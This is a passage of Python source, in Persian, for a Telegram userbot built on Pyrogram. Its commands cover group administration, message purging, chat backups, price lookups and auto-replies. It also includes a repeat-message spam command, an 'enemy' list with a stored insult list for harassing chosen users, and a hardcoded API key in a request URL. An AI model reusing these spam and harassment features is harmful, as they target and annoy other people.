        await message.edit(f"✅ **کاربر ادمین شد**\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^حذف ادمین$') & filters.group)
async def demote_user(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
        return
    try:
        user_id = message.reply_to_message.from_user.id
        from pyrogram.types import ChatPrivileges
        
        privileges = ChatPrivileges(
            can_manage_chat=False,
            can_delete_messages=False,
            can_restrict_members=False,
            can_promote_members=False,
            can_change_info=False,
            can_invite_users=False,
            can_pin_messages=False,
            can_manage_video_chats=False
        )
        await client.promote_chat_member(
            chat_id=message.chat.id,
            user_id=user_id,
            privileges=privileges
        )
        await message.edit(f"✅ **کاربر غیرادمین شد**\n👤 آیدی: `{user_id}`")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^پاک (\d+)$') & filters.group)
async def purge_messages(client, message):
    try:
        count = int(message.matches[0].group(1))
        if count > 100:
            await message.edit("❌ **حداکثر تعداد مجاز: 100 پیام**")
            return
        
        deleted = 0
        async for msg in client.get_chat_history(message.chat.id, limit=count+1):
            if msg.id != message.id:
                try:
                    await msg.delete()
                    deleted += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        
        await message.edit(f"✅ **{deleted} پیام پاک شد**")
        await asyncio.sleep(3)
        await message.delete()
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^پین$') & filters.group)
async def pin_message(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیامی که می‌خواهید پین کنید ریپلای کنید**")
        return
    try:
        await client.pin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.edit("✅ **پیام پین شد**")
        await asyncio.sleep(2)
        await message.delete()
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^آنپین$') & filters.group)
async def unpin_message(client, message):
    if not message.reply_to_message:
        await message.edit("❌ **لطفا روی پیام پین شده ریپلای کنید**")
        return
    try:
        await client.unpin_chat_message(message.chat.id, message.reply_to_message.id)
        await message.edit("✅ **پیام آنپین شد**")
        await asyncio.sleep(2)
        await message.delete()
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^تنظیم عنوان (.+)$') & filters.group)
async def set_chat_title(client, message):
    try:
        new_title = message.matches[0].group(1)
        await client.set_chat_title(message.chat.id, new_title)
        await message.edit(f"✅ **عنوان گروه تغییر کرد**\n📝 عنوان جدید: {new_title}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^تنظیم توضیحات (.+)$') & filters.group)
async def set_chat_description(client, message):
    try:
        new_description = message.matches[0].group(1)
        await client.set_chat_description(message.chat.id, new_description)
        await message.edit(f"✅ **توضیحات گروه تغییر کرد**\n📝 توضیحات جدید: {new_description}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^تنظیم عکس$') & filters.group)
async def set_chat_photo(client, message):
    if not message.reply_to_message or not message.reply_to_message.photo:
        await message.edit("❌ **لطفا روی یک عکس ریپلای کنید**")
        return
    try:
        photo_path = await message.reply_to_message.download()
        await client.set_chat_photo(chat_id=message.chat.id, photo=photo_path)
        os.remove(photo_path)
        await message.edit("✅ **عکس گروه تغییر کرد**")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^اطلاعات گروه$') & filters.group)
async def group_info(client, message):
    try:
        chat = await client.get_chat(message.chat.id)
        admins = []
        async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
            admins.append(admin.user)
        
        info_text = f"""📊 **اطلاعات گروه**

📌 **عنوان:** {chat.title}
🆔 **آیدی:** `{chat.id}`
👥 **تعداد اعضا:** {chat.members_count if chat.members_count else 'نامشخص'}
📝 **توضیحات:** {chat.description or 'ندارد'}
🔗 **لینک:** {chat.invite_link or 'ندارد'}

👑 **ادمین‌ها ({len(admins)} نفر):**
"""
        for i, admin in enumerate(admins[:10], 1):
            username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
            info_text += f"{i}. {admin.first_name or 'نامشخص'} {admin.last_name or ''} - {username}\n"
        
        if len(admins) > 10:
            info_text += f"\n... و {len(admins) - 10} ادمین دیگر"
        
        await message.edit(info_text)
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^لیست ادمین$') & filters.group)
async def list_admins(client, message):
    try:
        admins = []
        async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
            admins.append(admin.user)
        
        if not admins:
            await message.edit("❌ **هیچ ادمینی در گروه یافت نشد**")
            return
        
        list_text = f"👑 **لیست ادمین‌ها ({len(admins)} نفر)**\n\n"
        for i, admin in enumerate(admins, 1):
            username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
            list_text += f"{i}. **{admin.first_name or 'نامشخص'}** {admin.last_name or ''}\n"
            list_text += f"   🆔 `{admin.id}`\n"
            list_text += f"   📱 {username}\n\n"
        
        await message.edit(list_text)
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^تعداد اعضا$') & filters.group)
async def members_count(client, message):
    try:
        chat = await client.get_chat(message.chat.id)
        count = chat.members_count if chat.members_count else "نامشخص"
        await message.edit(f"👥 **تعداد اعضای گروه:** {count}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
async def slowmode_on(client, message):
    try:
        await client.set_slow_mode(chat_id=message.chat.id, seconds=60)
        await message.edit("🔒 **اهسته روشن شد**\nکاربران هر 60 ثانیه یک بار میتوانند پیام بفرستند")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
async def slowmode_off(client, message):
    try:
        await client.set_slow_mode(chat_id=message.chat.id, seconds=0)
        await message.edit("🔓 **اهسته خاموش شد**\nهمه کاربران میتوانند بدون محدودیت پیام بفرستند")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.text & ~filters.command([
    "سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم", 
    "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد", 
    "پاسخ", "دشمن", "فحش", "حذف", "لیست دشمن", "دشمنان", "پاک کردن دشمنان", 
    "همه", "مدیا", "استیکر", "فوروارد", "ویس", "پیام", "فایل", "وضعیت قفل", 
    "ریست قفل", "راهنمای قفل", 
    "انتی لاگین", "ریکت", "حذف ریکت", "لیست ریکت", "پاکسازی ریکت",
    "ویرایش",
    "تنظیم بنر", "بنر همگانی", "لیست بنرها", "حذف بنر", "بنر همگانی خاموش", "بنر ارسال", "زمان بنر",
    "فرمت",
    "پینگ", "تعداد کانال ها", "تعداد گروه ها", "خروج همه کانال", "خروج همه گروه",
    "اکشن",
    "اینستا" 
], prefixes=""))
async def auto_html_format_messages(client, message):
    if not any(format_settings.values()):
        return
    
    original_text = message.text
    if not original_text:
        return
    
    formatted_text = original_text
    for format_name, is_active in format_settings.items():
        if is_active and format_name in html_tags:
            try:
                if format_name == "خط‌خورده":
                    formatted_text = f"<s>{formatted_text}</s>"
                else:
                    formatted_text = html_tags[format_name].format(formatted_text)
            except Exception as e:
                print(f"❌ خطا در اعمال فرمت {format_name}: {e}")
    if formatted_text != original_text:
        try:
            await message.edit_text(
                formatted_text,
                parse_mode=enums.ParseMode.HTML
            )
        except Exception as e:
            print(f"❌ خطا در ویرایش پیام: {e}")
            try:
                await message.edit_text(original_text)
            except:
                pass
@app.on_message(filters.me & filters.command("سیو", prefixes=""))
async def save_command(client: Client, message: Message):
    if len(message.command) < 2: 
        return await message.edit_text("**لطفا یوزرنیم کاربر را وارد کنید**\n\nمثال: `سیو @LuminousPath`")
    
    chat_input = message.command[1].lstrip('@')
    try:
        user = await client.get_users(chat_input)
        chat_id, user_name = user.id, f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{user.id}"
    except: 
        return await message.edit_text(f"**کاربر '{chat_input}' پیدا نشد**")
    
    loading_msg = await message.edit_text(f"🔄 **در حال پشتیبان‌گیری از {user_name}...**")
    success, result, message_count, user_name = await backup_chat(client, chat_id, message.id)
    
    if success:
        await loading_msg.edit_text("**در حال آپلود فایل پشتیبان...**")
        await client.send_document(
            "me", 
            document=result, 
            caption=f"**پشتیبان‌گیری کامل شد**\n\n**کاربر:** {user_name}\n**آیدی:** `{chat_id}`\n**تعداد پیام‌ها:** {message_count}\n**فرمت:** فایل متنی (TXT)\n**تاریخ:** {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        os.remove(result)
        await loading_msg.delete()
    else: 
        await loading_msg.edit_text(f"❌ **خطا در پشتیبان‌گیری:**\n`{result}`")

@app.on_message(filters.me & filters.command("تایم", prefixes="") & filters.regex(r"^تایم (روشن|خاموش)$"))
async def time_command(client: Client, message: Message):
    global time_updater_started  
    if len(message.command) < 2: 
        return await message.edit("**استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")
    
    action = message.command[1]
    user_id = message.from_user.id
    
    if action == "روشن":
        user_time_status[user_id] = True
        user_original_names.setdefault(user_id, message.from_user.first_name or "")
        success = await update_name_with_time(user_id, client)
        
        if not time_updater_started:  
            time_updater_started = True  
            asyncio.create_task(continuous_time_updater(client))
        
        await message.edit("**تایم کنار نام فعال شد**\n**راس هر دقیقه آپدیت می‌شود**" if success else "**خطا در تغییر نام**")
        
    elif action == "خاموش":
        user_time_status[user_id] = False
        if user_id in user_original_names:
            try:
                await client.update_profile(first_name=user_original_names[user_id])
                await message.edit("**تایم کنار نام غیرفعال شد**\nنام شما به حالت اول بازگشت")
            except: 
                await message.edit("❌ خطا در بازگردانی نام")
        else: 
            await message.edit("✅ تایم کنار نام غیرفعال شد")
    else:
        await message.edit("⚠️ **استفاده:**\n`تایم روشن` - فعال کردن\n`تایم خاموش` - غیرفعال کردن")

@app.on_message(filters.me & filters.command("لیست فونت", prefixes=""))
async def font_list_command(client: Client, message: Message):
    sample_time = "12:34"
    fonts_samples = ""
    for i in range(1, 16):
        font_dict = FONTS.get(i, FONTS[1])
        preview = ''.join([font_dict.get(char, char) for char in sample_time])
        fonts_samples += f"**فونت {i}:** {preview}\n"
    
    await message.edit(f"🔤 **لیست فونت‌های زمان (۱۵ فونت)**\n\n{fonts_samples}\n\n**استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 15`")

@app.on_message(filters.me & filters.command("تنظیم فونت", prefixes=""))
async def set_font_command(client: Client, message: Message):
    if len(message.command) < 2: 
        return await message.edit("⚠️ **استفاده:**\n`تنظیم فونت 1` تا `تنظیم فونت 15`")
    
    try:
        font_num = int(message.command[1])
        if 1 <= font_num <= 15: 
            user_fonts["me"] = font_num
            if user_time_status.get(message.from_user.id, False): 
                await update_name_with_time(message.from_user.id, client)
            await message.edit(f"✅ **فونت زمان به شماره {font_num} تغییر کرد**\n\nنمونه: {get_iran_time()}")
        else: 
            await message.edit("❌ **شماره فونت باید بین 1 تا 15 باشد**")
    except ValueError: 
        await message.reply("❌ **لطفا یک عدد وارد کنید**\nمثال: `تنظیم فونت 2`")
@app.on_message(filters.me & filters.command("قیمت", prefixes=""))
async def price_command(client: Client, message: Message):
    try:
        if len(message.command) < 2:
            await message.edit_text("❌ **لطفا نام ارز را وارد کنید**\nمثال: `قیمت ton` یا `قیمت بیت‌کوین`")
            return
        
        coin_input = ' '.join(message.command[1:]).strip()
        loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
                if response.status == 200:
                    data = await response.json()                    
                    if data.get("ok"):
                        prices = data["result"]
                        found_coin = None
                        coin_key = None
                        if coin_input.upper() in prices:
                            found_coin = prices[coin_input.upper()]
                            coin_key = coin_input.upper()
                        else:
                            for key, coin_data in prices.items():
                                if 'name' in coin_data and coin_input.lower() in coin_data['name'].lower():
                                    found_coin = coin_data
                                    coin_key = key
                                    break                        
                        if found_coin and coin_key:
                            coin_data = found_coin
                            price_text = f"""**💰 قیمت {coin_data['name']} ({coin_key})**
💵 **قیمت تومانی:** `{'{:,}'.format(int(float(coin_data['irr'])))}` تومان
💰 **قیمت دلاری:** `{float(coin_data['usdt']):,.2f}$`
📊 **تغییر 24h:** {'🟢' if float(coin_data['dayChange']) > 0 else '🔴'} `{coin_data['dayChange']}%`

⏰ **آپدیت:** {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%H:%M')}
"""
                            await loading_msg.edit_text(price_text)
                        else:
                            await loading_msg.edit_text(f"❌ **ارز '{coin_input}' یافت نشد**\n\n💡 **مثال‌ها:**\n`قیمت BTC` - `قیمت بیت‌کوین`\n`قیمت ETH` - `قیمت اتریوم`\n`قیمت TON` - `قیمت تون`")
                    else:
                        await loading_msg.edit_text("❌ خطا در دریافت اطلاعات از API")
                else:
                    await loading_msg.edit_text("❌ خطا در اتصال به سرور")
                    
    except Exception as e:
        await message.edit_text(f"❌ خطا: {str(e)}")

@app.on_message(filters.me & filters.command("اسپم", prefixes=""))
async def spam_command(client: Client, message: Message):
    if len(message.command) < 3:
        return await message.edit_text("❌ **فرمت صحیح:**\n`اسپم 10 سلام`\n\nعدد = تعداد پیام\nمتن = پیام مورد نظر")
    
    try:
        count = int(message.command[1])
        if count > 50:
            return await message.edit_text("❌ **حداکثر تعداد مجاز: 50 پیام**")
        
        spam_text = ' '.join(message.command[2:])
        
        if not spam_text:
            return await message.edit_text("❌ **لطفا متن پیام را وارد کنید**")
        
        loading_msg = await message.edit_text(f"🔄 **در حال ارسال {count} پیام...**")
        
        success_count = 0
        for i in range(count):
            try:
                await client.send_message(
                    message.chat.id,
                    f"{spam_text}",
                    reply_to_message_id=message.reply_to_message_id if message.reply_to_message else None
                )
                success_count += 1
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"خطا در ارسال پیام {i+1}: {e}")
        
        await loading_msg.edit_text(f"✅ **اسپم کامل شد**\n\n📤 **تعداد ارسال شده:** {success_count}/{count}\n💬 **متن:** {spam_text[:50]}{'...' if len(spam_text) > 50 else ''}")
        
    except ValueError:
        await message.edit_text("❌ **لطفا تعداد را به صورت عدد وارد کنید**\nمثال: `اسپم 10 سلام`")
    except Exception as e:
        await message.edit_text(f"❌ **خطا در ارسال اسپم:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("پاسخ", prefixes=""))
async def auto_reply_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")
    
    sub_command = message.command[1]
    
    if sub_command == "افزودن":
        if len(message.command) < 3:
            return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
        
        try:
            parts = ' '.join(message.command[2:]).split('|', 1)
            if len(parts) != 2:
                return await message.edit("❌ **فرمت صحیح:**\n`پاسخ افزودن سلام|سلام چطوری`")
            
            trigger, reply = parts[0].strip(), parts[1].strip()
            auto_replies[trigger] = reply
            await message.edit(f"✅ **پاسخ خودکار افزوده شد**\n\n**متن:** {trigger}\n**پاسخ:** {reply}")
        except Exception as e:
            await message.edit(f"❌ **خطا در افزودن پاسخ:**\n`{e}`")
    
    elif sub_command == "حذف":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن پاسخ را وارد کنید**\nمثال: `پاسخ حذف سلام`")
        
        trigger = ' '.join(message.command[2:]).strip()
        if trigger in auto_replies:
            del auto_replies[trigger]
            await message.edit(f"✅ **پاسخ خودکار حذف شد**\n\n**متن:** {trigger}")
        else:
            await message.edit(f"❌ **پاسخ برای متن '{trigger}' یافت نشد**")
    
    elif sub_command == "لیست":
        if not auto_replies:
            await message.edit("❌ **هیچ پاسخی تنظیم نشده**")
        else:
            replies_list = "\n".join([f"• **{trigger}** → {reply}" for trigger, reply in auto_replies.items()])
            await message.edit(f"📝 **لیست پاسخ‌های خودکار**\n\n{replies_list}\n\n**تعداد:** {len(auto_replies)}")
    
    else:
        await message.edit("⚠️ **استفاده:**\n`پاسخ افزودن سلام|سلام چطوری`\n`پاسخ حذف سلام`\n`پاسخ لیست`")

@app.on_message(filters.me & filters.command("دشمن", prefixes=""))
async def enemy_command(client: Client, message: Message):
    if not message.reply_to_message:
        return await message.edit("❌ **لطفا روی پیام کاربر ریپلای کن**")
    
    enemy_user = message.reply_to_message.from_user
    enemy_id = enemy_user.id
    
    if is_enemy(enemy_id):
        await message.edit(f"❌ **این کاربر از قبل دشمن است**\n\n👤 کاربر: {enemy_user.first_name}\n🆔 آیدی: `{enemy_id}`")
    else:
        enemies.add(enemy_id)
        save_enemies(enemies)
        await message.edit(f"**کاربر مورد نظر به لیست دشمن ها اضافه شد 😈**")

@app.on_message(filters.me & filters.command("فحش", prefixes=""))
async def insult_command(client: Client, message: Message):
    if len(message.command) < 2:
        return await message.edit("""
⚠️ **سیستم مدیریت فحش‌ها**

📋 **دستورات موجود:**
• `فحش افزودن [متن]` - افزودن فحش جدید
• `فحش حذف [متن]` - حذف فحش
• `لیست فحش` - مشاهده لیست فحش‌ها

📝 **مثال:**
`فحش افزودن تو احمقی`
`فحش حذف تو احمقی`
`لیست فحش`
""")
    
    sub_command = message.command[1]
    
    if sub_command == "افزودن":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش افزودن تو احمقی`")
        
        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text not in insults_list:
            insults_list.append(insult_text)
            if save_insults(insults_list):
                await message.edit(f"✅ **فحش افزوده شد**\n\n💢 متن: {insult_text}")
            else:
                await message.edit("❌ **خطا در ذخیره فحش**")
        else:
            await message.edit(f"❌ **این فحش از قبل وجود دارد**")
    
    elif sub_command == "حذف":
        if len(message.command) < 3:
            return await message.edit("❌ **لطفا متن فحش را وارد کنید**\nمثال: `فحش حذف تو احمقی`")
        
        insult_text = ' '.join(message.command[2:]).strip()
        insults_list = load_insults()
        if insult_text in insults_list:
            insults_list.remove(insult_text)
            if save_insults(insults_list):
                await message.edit(f"✅ **فحش حذف شد**\n\n💢 متن: {insult_text}")
            else:
                await message.edit("❌ **خطا در حذف فحش**")
        else:
            await message.edit(f"❌ **این فحش یافت نشد**")
    
    else:
        await message.edit("⚠️ **استفاده:**\n`فحش افزودن [متن]`\n`فحش حذف [متن]`\n`لیست فحش`")

@app.on_message(filters.me & filters.command("حذف", prefixes=""))
async def remove_enemy_command(client: Client, message: Message):
    text = message.text.strip()
    if text == "حذف دشمن":
        if not message.reply_to_message:
            return await message.edit("❌ باید روی پیام دشمن ریپلای کنی")

        user_id = message.reply_to_message.from_user.id

        if user_id in enemies:
            enemies.remove(user_id)
            save_enemies(enemies)
            return await message.edit("✅ کاربر با موفقیت از لیست دشمن حذف شد")
        else:
            return await message.edit("⚠️ این کاربر داخل لیست دشمن نیست")

@app.on_message(filters.me & filters.command("لیست دشمن", prefixes=""))
async def enemy_list_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان خالی است**")
    
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات دشمنان...**")
        
        enemies_list = []
        
        for enemy_id in list(enemies):
            try:
                user = await client.get_users(enemy_id)
                first_name = user.first_name or ""
                last_name = user.last_name or ""
                username = f"@{user.username}" if user.username else "❌ ندارد"
                full_name = f"{first_name} {last_name}".strip()
                
                enemies_list.append({
                    'id': enemy_id,
                    'name': full_name,
                    'username': username
                })
                await asyncio.sleep(0.1)
                
            except Exception as e:
                print(f"❌ خطا در دریافت اطلاعات کاربر {enemy_id}: {e}")
                enemies_list.append({
                    'id': enemy_id,
                    'name': "❌ خطا در دریافت",
                    'username': "❌ خطا در دریافت"
                })
        
        if not enemies_list:
            return await loading_msg.edit("❌ **هیچ دشمنی در لیست وجود ندارد**")
        
        list_text = f"👿 **لیست دشمنان - تعداد: {len(enemies_list)}**\n\n"
        
        for i, enemy in enumerate(enemies_list, 1):
            list_text += f"{i}. **نام:** {enemy['name']}\n"
            list_text += f"   **آیدی:** `{enemy['id']}`\n"
            list_text += f"   **یوزرنیم:** {enemy['username']}\n"
            list_text += "   " + "─" * 30 + "\n"
        
        if len(list_text) > 4000:
            parts = [list_text[i:i+4000] for i in range(0, len(list_text), 4000)]
            for part in parts:
                await client.send_message(message.chat.id, part)
            await loading_msg.delete()
        else:
            await loading_msg.edit(list_text)
            
    except Exception as e:
        await message.edit(f"❌ **خطا در دریافت لیست دشمنان:**\n`{e}`")

@app.on_message(filters.me & filters.command("دشمنان", prefixes=""))
async def enemies_compact_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان خالی است**")
    
    try:
        loading_msg = await message.edit("?? **در حال دریافت اطلاعات...**")
        
        compact_text = f"👿 **لیست دشمنان - تعداد: {len(enemies)}**\n\n"
        
        for i, enemy_id in enumerate(list(enemies), 1):
            try:
                user = await client.get_users(enemy_id)
                first_name = user.first_name or ""
                last_name = user.last_name or ""
                username = f"@{user.username}" if user.username else "بدون یوزرنیم"
                full_name = f"{first_name} {last_name}".strip() or "بدون نام"
                
                compact_text += f"{i}. **{full_name}** - {username} - `{enemy_id}`\n"
                
            except Exception as e:
                compact_text += f"{i}. ❌ خطا در دریافت - `{enemy_id}`\n"
        
        await loading_msg.edit(compact_text)
        
    except Exception as e:
        await message.edit(f"❌ **خطا:**\n`{e}`")

@app.on_message(filters.me & filters.command("پاک کردن دشمنان", prefixes=""))
async def clear_enemies_command(client: Client, message: Message):
    if not enemies:
        return await message.edit("❌ **لیست دشمنان از قبل خالی است**")
    
    enemy_count = len(enemies)
    enemies.clear()
    save_enemies(enemies)
    
    await message.edit(f"✅ **تمام دشمنان پاک شدند**\n\n🗑 **تعداد حذف شده:** {enemy_count} نفر")
@app.on_message(filters.me & filters.command("ایدی", prefixes="") & filters.regex(r"^ایدی$"))
async def advanced_id_command(client: Client, message: Message):
    try:
        user = message.from_user
        chat = message.chat
        
        premium_status = "<b>فعال</b>" if user.is_premium else "<i>غیرفعال</i>"
        username_id = f"@{user.username}" if user.username else "<i>ندارد</i>"
        profile_photos = await client.get_chat_photos_count(user.id)
        
        if message.reply_to_message:
            replied_user = message.reply_to_message.from_user
            replied_chat = message.chat
            
            common_chats = await client.get_common_chats(replied_user.id)
            
            user_info = f"""
<b>• اطلاعات کاربر</b>

<b>آیدی عددی:</b> <code>{replied_user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {replied_user.first_name or '<i>ندارد</i>'}
<b>نام خانوادگی:</b> {replied_user.last_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {"<b>فعال</b>" if replied_user.is_premium else "<i>غیرفعال</i>"}
<b>تعداد پروفایل:</b> {await client.get_chat_photos_count(replied_user.id)}

<b>• اطلاعات چت</b>
<b>آیدی چت:</b> <code>{replied_chat.id}</code>
<b>عنوان چت:</b> {replied_chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {replied_chat.members_count if hasattr(replied_chat, 'members_count') and replied_chat.members_count else '<i>نامشخص</i>'}
"""
            
            if common_chats:
                user_info += f"\n<b>• گروه‌های مشترک:</b> {len(common_chats)}\n"
                user_info += f"<blockquote>"
                
                for i, common_chat in enumerate(common_chats, 1):
                    chat_type = "گروه" if common_chat.type in ["group", "supergroup"] else "کانال" if common_chat.type == "channel" else "شخصی"
                    username = f"@{common_chat.username}" if common_chat.username else "بدون یوزرنیم"
                    members = f"{common_chat.members_count} عضو" if hasattr(common_chat, 'members_count') and common_chat.members_count else "نامشخص"
                    
                    user_info += f"<b>{i}. {common_chat.title}</b>\n"
                    user_info += f"<i>نوع:</i> {chat_type}\n"
                    user_info += f"<i>یوزرنیم:</i> {username}\n"
                    user_info += f"<i>اعضا:</i> {members}\n"
                    user_info += f"<i>آیدی:</i> <code>{common_chat.id}</code>"
                    
                    if i < len(common_chats):
                        user_info += f"\n\n"
                
                user_info += f"</blockquote>"
            else:
                user_info += f"\n<b>• گروه‌های مشترک:</b> <i>هیچ گروه مشترکی یافت نشد</i>"
            
            await message.edit_text(user_info, parse_mode=enums.ParseMode.HTML)
            
        else:
            chat_info = f"""
<b>• اطلاعات کاربر و چت</b>

<b>اطلاعات شما</b>
<b>آیدی عددی:</b> <code>{user.id}</code>
<b>یوزرنیم:</b> <code>{username_id}</code>
<b>نام:</b> {user.first_name or '<i>ندارد</i>'}
<b>نام خانوادگی:</b> {user.last_name or '<i>ندارد</i>'}
<b>پریمیوم:</b> {premium_status}
<b>تعداد پروفایل:</b> {profile_photos}

<b>اطلاعات چت فعلی</b>
<b>آیدی چت:</b> <code>{chat.id}</code>
<b>عنوان چت:</b> {chat.title or '<i>ندارد</i>'}
<b>تعداد اعضا:</b> {chat.members_count if hasattr(chat, 'members_count') and chat.members_count else '<i>نامشخص</i>'}
"""
            await message.edit_text(chat_info, parse_mode=enums.ParseMode.HTML)
            
    except Exception as e:
        await message.edit_text(f"<b>خطا در دریافت اطلاعات:</b>\n<code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("دانلود", prefixes=""))
async def download_from_link(client: Client, message: Message):
    if len(message.command) < 2:
        await message.edit_text("❌ **فرمت:**\n`دانلود https://t.me/channel/123`")
        return    
    link = message.command[1]    
    try:
        pattern = r"https://t\.me/(.+)/(\d+)"
        match = re.match(pattern, link)        
        if not match:
            await message.edit_text("❌ **لینک نامعتبر!**\nفرمت صحیح: `https://t.me/channel/123`")
            return        
        username = match.group(1)
        post_id = int(match.group(2))        
        processing_msg = await message.edit_text("🔍 **در حال دریافت پست...**")
        post = await client.get_messages(username, post_id)        
        if not post:
            await processing_msg.edit_text("❌ **پست یافت نشد**")
            return        
        await processing_msg.edit_text("📥 **در حال کپی کردن پست...**")        
        try:
            await post.copy("me")
            await processing_msg.edit_text("✅ **پست با موفقیت در پیام‌های ذخیره شده کپی شد**")            
        except Exception as copy_error:
            await processing_msg.edit_text("🔄 **روش دوم: در حال ارسال محتوا...**")            
            try:
                if post.media:
                    file_path = await post.download()
                    if post.audio:
                        await client.send_audio("me", file_path, caption=post.caption or "")
                    elif post.video:
                        await client.send_video("me", file_path, caption=post.caption or "")
                    elif post.photo:
                        await client.send_photo("me", file_path, caption=post.caption or "")
                    elif post.document:
                        await client.send_document("me", file_path, caption=post.caption or "")
                    elif post.voice:
                        await client.send_voice("me", file_path, caption=post.caption or "")
                    elif post.sticker:
                        await client.send_sticker("me", file_path)
                    elif post.animation:
                        await client.send_animation("me", file_path, caption=post.caption or "")
                    elif post.video_note:
                        await client.send_video_note("me", file_path)
                    else:
                        await client.send_document("me", file_path, caption=post.caption or "")                    
                    os.remove(file_path)
                if post.text:
                    await client.send_message("me", post.text)                
                await processing_msg.edit_text("✅ **محتوا با موفقیت ارسال شد**")                
            except Exception as download_error:
                await processing_msg.edit_text(f"❌ **خطا:** `{str(download_error)}`")            
    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)}`")
@app.on_message(filters.me & filters.regex(r'^آنلاین (روشن|خاموش)$'))
async def online_command(client, message):
    global always_online_enabled
    
    action = message.matches[0].group(1)
    
    if action == "روشن":
        always_online_enabled = True
        await message.edit_text(
            "✅ **حالت همیشه آنلاین فعال شد**\n\n"
            "🌐 اکانت شما همیشه به عنوان آنلاین نمایش داده خواهد شد."
        )
        asyncio.create_task(keep_online(client))
        
    elif action == "خاموش":
        always_online_enabled = False
        await message.edit_text(
            "❌ **حالت همیشه آنلاین غیرفعال شد**"
        )

@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه روشن$"))
async def lock_all_on_command(client, message):
    lock_settings["همه"] = True
    await message.edit("✅ **قفل همه فعال شد**\n\nتمامی پیام‌ها در پیوی حذف خواهند شد.")

@app.on_message(filters.me & filters.command("همه", prefixes="") & filters.regex(r"^همه خاموش$"))
async def lock_all_off_command(client, message):
    lock_settings["همه"] = False
    await message.edit("✅ **قفل همه غیرفعال شد**")

@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا روشن$"))
async def lock_media_on_command(client, message):
    lock_settings["مدیا"] = True
    await message.edit("✅ **قفل مدیا فعال شد**\n\nارسال عکس و ویدیو در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("مدیا", prefixes="") & filters.regex(r"^مدیا خاموش$"))
async def lock_media_off_command(client, message):
    lock_settings["مدیا"] = False
    await message.edit("✅ **قفل مدیا غیرفعال شد**")

@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر روشن$"))
async def lock_sticker_on_command(client, message):
    lock_settings["استیکر"] = True
    await message.edit("✅ **قفل استیکر فعال شد**\n\nارسال استیکر و گیف در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("استیکر", prefixes="") & filters.regex(r"^استیکر خاموش$"))
async def lock_sticker_off_command(client, message):
    lock_settings["استیکر"] = False
    await message.edit("✅ **قفل استیکر غیرفعال شد**")

